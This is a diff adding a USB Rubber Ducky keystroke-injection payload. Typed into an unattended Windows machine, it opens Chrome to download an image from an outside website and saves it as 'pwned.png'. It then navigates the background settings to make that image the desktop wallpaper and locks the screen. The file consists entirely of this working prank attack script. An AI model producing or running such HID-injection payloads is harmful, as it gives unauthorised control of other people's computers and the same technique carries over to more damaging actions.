@@ -1,0 +1,42 @@
+REM ------------------------------------
+REM :Credit To Fives
+REM ------------------------------------
+DELAY 500
+GUI M
+DELAY 300
+GUI r
+DELAY 300
+STRING chrome.exe https://newfastuff.com/wp-content/uploads/2019/02/hello_there.png
+ENTER
+DELAY 1500
+CTRL s
+DELAY 800
+STRING %userprofile%\downloads\pwned.png
+ENTER
+DELAY 500
+CTRL W
+DELAY 500
+CONTROL ESCAPE
+DELAY 500
+STRING Background image settings
+DELAY 600
+ENTER
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+ENTER
+DELAY 600
+STRING %userprofile%\downloads\pwned.png
+ENTER
+DELAY 1000
+GUI M
+DELAY 500
+GUI L
+
+
